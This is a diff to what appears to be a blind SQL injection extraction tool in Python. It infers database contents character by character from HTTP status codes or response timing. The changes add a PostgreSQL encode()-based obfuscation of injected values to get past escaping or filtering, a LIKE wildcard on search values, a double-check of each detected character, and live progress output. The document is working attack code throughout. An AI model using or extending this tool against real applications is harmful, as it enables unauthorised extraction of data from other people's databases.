@@ -49,6 +49,9 @@ _CONFIG_DEFAULT_SINGLE_VALUE_SEARCH = False
 _CONFIG_ESCAPE_VALUE = "escape_value"
 _CONFIG_DEFAULT_ESCAPE_VALUE = True
 
+_CONFIG_ENCODE_VALUE = "encode_value"
+_CONFIG_DEFAULT_ENCODE_VALUE = True
+
 
 def _read_configurations():
     with open('config.json') as file:
@@ -79,6 +82,10 @@ def _call(config, injected_value, time_threshold=0):
     valid_response = response.status_code == expected_error_code
     response.close()
 
+    if not valid_response:
+        _logger.warning(
+            'Call failed value={}, code={}, text={}'.format(injected_value, response.status_code, response.text))
+
     if valid_response and time_threshold > 0:
         valid_response = time_took > time_threshold
 
@@ -98,11 +105,14 @@ def _call_with_value(config, search_value, is_exact, is_activation):
     time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)
 
     escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
+    encode_value = config.get(_CONFIG_ENCODE_VALUE, _CONFIG_DEFAULT_ENCODE_VALUE)
 
     if escape_value:
-        search_value = search_value.replace('\\', '[\\]')
-        search_value = search_value.replace('_', '\\_')
-        search_value = search_value.replace('%', '\\%')
+        search_value = '\'' + ''.join(['\\' + ch for ch in search_value]) + '\''
+
+    elif encode_value:
+        search_value = ' || '.join(
+            ['\'\\\' || encode(\'\\x' + format(ord(ch), 'x') + '\',\'escape\')' for ch in search_value])
 
     sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
 
@@ -111,6 +121,7 @@ def _call_with_value(config, search_value, is_exact, is_activation):
     elif is_activation:
         inner = config[_CONFIG_SQL_ACTIVATION]
     else:
+        search_value = search_value + ' || \'%\''
         inner = config[_CONFIG_SQL_SEARCH]
 
     value = valid_value + sql_payload. \
@@ -150,17 +161,27 @@ def _extract_data(config):
             found_next = False
             chars_len = len(search_chars)
             curr_ch_index = 0
+
+            logging.getLogger().handlers[0].flush()
             while (not found_next) and curr_ch_index < chars_len:
                 ch = search_chars[curr_ch_index]
                 curr_ch_index = curr_ch_index + 1
 
                 _logger.debug("Checking {}".format(prefix + ch))
+
+                if single_value:
+                    print('\r' + prefix + ch, end='')
+
                 is_correct = _call_with_value(config, prefix + ch, False, False)
+
+                # Double check
+                if is_correct:
+                    is_correct = _call_with_value(config, prefix + ch, False, False)
+
                 if is_correct:
                     detected_prefixes.append(prefix + ch)
 
                     if single_value:
-                        print(ch, end='')
                         found_next = True
                     else:
                         _logger.debug("Detected valid prefix {}".format(prefix + ch))
